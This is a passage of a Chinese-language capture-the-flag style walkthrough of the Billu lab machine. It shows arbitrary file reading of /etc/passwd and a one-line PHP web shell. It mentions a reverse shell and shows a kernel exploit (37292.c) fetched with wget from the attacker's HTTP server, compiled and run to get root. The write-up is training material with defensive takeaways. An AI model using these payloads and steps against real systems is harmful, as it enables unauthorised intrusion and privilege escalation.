## 三、Web 信息收集与漏洞发现

```

/add

其中：

- `/phpmy/`：疑似数据库管理相关目录。
- `/test.php`：存在文件操作功能。
- `/add`：存在图片上传功能。
- <img src=".\images\03.png" alt="01" style="zoom:33%;" />

### 2. 任意文件下载漏洞

访问：

```
http://172.20.10.3/test.php?file=/etc/passwd
```

通过分析 `test.php` 的文件处理逻辑，发现可以利用 POST 方法实现任意文件下载。

利用目的：

- 读取 Linux 系统敏感文件。
- 获取系统用户信息。
- 查找网站配置文件。
- 寻找数据库连接凭据。
- <img src=".\images\04.png" alt="01" style="zoom:33%;" />

## 四、文件上传与命令执行

### 1. 图片上传功能

访问：

```
http://172.20.10.3/add
```

发现图片上传功能。

对上传点进行测试，分析服务端对文件类型、文件内容及上传文件的处理机制。

### 2. PHP 命令执行

通过文件上传及相关漏洞利用，进一步获得 PHP 命令执行能力。

使用以下 PHP 代码实现 GET 参数传递命令：

```
<?php
system($_GET['a']);
?>
```

通过 GET 参数传递系统命令。

例如：

```
? a=id
```

实际请求时将参数拼接到对应的 PHP 文件 URL 中。

### 3. 验证命令执行

执行系统命令：

```
id
whoami
uname -a
```

确认命令执行成功，进一步判断当前用户权限。

## 五、获取 Shell

### 1. 反弹 Shell

在确认 PHP 命令执行成功后，利用命令执行漏洞建立反弹 Shell。

在 Kali 攻击机上开启监听，等待目标主机连接。

成功获取目标主机的交互式 Shell。

### 2. 确认当前权限

获取 Shell 后执行：

```
whoami
id
```

确认当前权限为：

```

## 六、Linux 权限提升

### 1. 系统信息收集

获取目标系统版本、内核版本及当前用户权限：

```
whoami
id
uname -a
cat /etc/issue
sudo -l
```

重点检查：

- Linux 内核版本。
- 操作系统版本。
- 当前用户权限。
- sudo 特殊权限。
- SUID 文件。
- 已知内核漏洞。

### 2. Linux 内核漏洞排查

通过系统信息判断目标系统是否存在已知 Linux 内核漏洞。

结合内核版本和系统环境，寻找对应的漏洞利用程序（Exploit）。

<img src=".\images\07.png" alt="01" style="zoom:33%;" />

### 3. 下载 Exploit 文件

在 Kali 攻击机上准备对应的漏洞利用源码：

```
37292.c
```

通过 Kali 开启 HTTP 服务：

```
python3 -m http.server 4792
```

目标主机使用 wget 下载：

```
wget http://172.20.10.4:4792/37292.c
```

注意：如果当前目录没有写入权限，会出现 `Permission denied`。

可以切换到具有写入权限的目录，例如：

```
cd /tmp
```

再执行下载命令。

### 4. 编译 Exploit

下载完成后，使用 GCC 编译 C 语言漏洞利用程序：

```
gcc 37292.c -o exploit
```

### 5. 执行 Exploit

运行编译后的漏洞利用程序：

```
chmod +x exploit
./exploit
```

成功利用系统漏洞，获得 Root 权限。

验证：

```
whoami
id
```

返回：

```
root
```

至此，完成 Billu 靶机的完整渗透测试。

## 七、渗透过程总结

### 1. 核心攻击路径

| 阶段         | 利用点         | 结果                   |
| ------------ | -------------- | ---------------------- |
| 信息收集     | Nmap 端口扫描  | 发现 SSH、HTTP 服务    |
| Web 信息收集 | 敏感路径探测   | 发现文件操作及上传入口 |
| 漏洞利用     | 任意文件下载   | 读取目标敏感文件       |
| 信息泄露     | 数据库配置文件 | 获取数据库连接信息     |
| 文件上传     | 图片上传功能   | 寻找可利用的上传入口   |
| 命令执行     | PHP system()   | 实现系统命令执行       |
| 获取 Shell   | 反弹 Shell     | 获得 www-data 权限     |
| Linux 提权   | 内核漏洞利用   | 获取 Root 权限         |

### 2. 本次涉及的知识点

1. Nmap 端口扫描与服务识别。
2. Web 敏感路径信息收集。
3. 任意文件读取与文件下载漏洞。
4. 图片上传漏洞及文件上传校验机制。
5. MySQL 数据库连接信息泄露。
6. PHP `system()` 命令执行。
7. 反弹 Shell。
8. Linux 系统信息收集。
9. Linux 内核漏洞排查。
10. wget 文件传输。
11. GCC 编译 C 语言 Exploit。
12. Linux 内核漏洞提权。

### 3. 实战收获

- Web 文件操作功能可能存在任意文件读取或下载风险，需要重点检查用户可控参数。
- 网站数据库配置文件可能包含数据库地址、用户名和密码等敏感信息。
- 图片上传功能不能只关注文件扩展名，还需要分析文件内容及服务端处理逻辑。
- PHP 的 `system()` 函数能够执行系统命令，如果用户输入没有得到有效限制，可能造成命令执行漏洞。
- 获取低权限 Shell 后，需要进一步进行 Linux 系统信息收集，寻找可利用的提权入口。
- Linux 提权不一定需要通过内核漏洞，也可能利用 SUID、sudo 配置错误、计划任务等方式实现。
- 使用 wget 下载 Exploit 时，需要注意当前用户对目标目录的写入权限。
- 下载 Exploit 后不能直接执行，应结合目标系统版本、漏洞适用条件和源码分析确认利用方式。
